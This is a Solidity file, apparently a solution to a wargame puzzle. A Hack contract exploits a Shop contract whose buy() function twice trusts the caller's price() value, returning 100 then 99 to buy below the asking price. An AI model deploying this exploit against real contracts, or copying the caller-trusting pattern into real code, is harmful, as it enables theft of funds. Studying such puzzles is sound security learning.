// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Hack {
    Shop private immutable target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function price() external view returns (uint) {
        if (target.isSold()) {
            return 99;
        }
        return 100;
    }

    function hack() external {
        target.buy();
        require(target.price() == 99, "hack didnt work");
    }
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
